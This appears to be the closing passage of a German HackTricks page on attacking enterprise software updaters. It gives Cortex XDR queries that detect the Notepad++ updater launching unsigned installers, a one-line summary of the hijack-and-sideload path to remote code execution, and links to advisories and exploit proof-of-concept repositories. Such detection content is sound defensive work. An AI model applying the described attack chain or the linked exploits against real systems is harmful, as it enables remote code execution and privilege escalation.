| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet ein Nicht-Notepad++-Installationsprogramm</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster lassen sich auf jeden Updater übertragen, der nicht signierte Manifeste akzeptiert oder die Signer der Installer nicht festlegt – Netzwerk-Hijacking + bösartiger Installer + BYO-signiertes Sideloading ermöglichen Remote Code Execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

---
## Referenzen
- [1] [Advisory – Netskope Client für Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation im Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung des Fixes für CVE-2025-0309 im Netskope Client für Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Privilege-Escalation-Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
